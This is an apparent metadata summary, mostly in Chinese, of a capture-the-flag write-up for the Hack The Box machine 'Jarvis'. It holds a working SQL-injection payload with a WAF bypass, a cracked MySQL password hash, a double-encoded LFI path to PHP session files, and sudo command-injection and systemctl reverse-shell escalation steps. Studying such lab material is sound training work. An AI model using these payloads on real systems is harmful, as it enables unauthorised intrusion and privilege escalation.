---
title: [HTB] Jarvis Writeup
contest: Hack The Box - Jarvis
year: 2018
difficulty: medium
vuln_type: sqli
tags: [ironwaf_bypass, room_sql_injection, order_by_column_count, mysql_user_hash_dump, hashcat_john_imissyou, lfi_php_filter, sudo_pepper_simpler_py, ping_injection_systemctl, lfi_253f_double_encoding, sqli_mysql]
attack_chain: supersecurehotel.htb /room.php?cod= 空格/**/绕 IronWAF 2.0.3 → order by 7 = 7 列 → union select 1,2,(subquery),4,5,6,7 注入 → mysql.user 提 DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 → hashcat imissyou → phpmyadmin 写 PHP shell → /index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_xxx LFI (双编码 253f 绕 check) → www-data → sudo -l pepper:ALL /var/www/Admin-Utilities/simpler.py → echo + systemctl link / enable --now 反弹 root
key_payload: 'GET /room.php?cod=-1/**/union/**/select/**/1,2,({0}),4,5,6,7%23' / mysql.user DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0:imissyou / target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_xxx / TF=$(mktemp).service; systemctl link/enable --now
one_liner: HTB Jarvis: supersecurehotel 房型 SQL 注入 IronWAF bypass + mysql.user 哈希 hashcat 爆 + phpmyadmin 写 shell + LFI 双编码绕 check + sudo -u pepper simpler.py 反弹 root。
lesson: IronWAF 2.0.3 用 /**/ 绕空格检测；LFI 路径中 %253f (双 URL 编码) 绕 check 内 file_exists();sudo -l NOPASSWD:simpler.py 用 $() 绕 & ` | ; - 字符黑名单是经典 sudo 提权。
quality: high
---
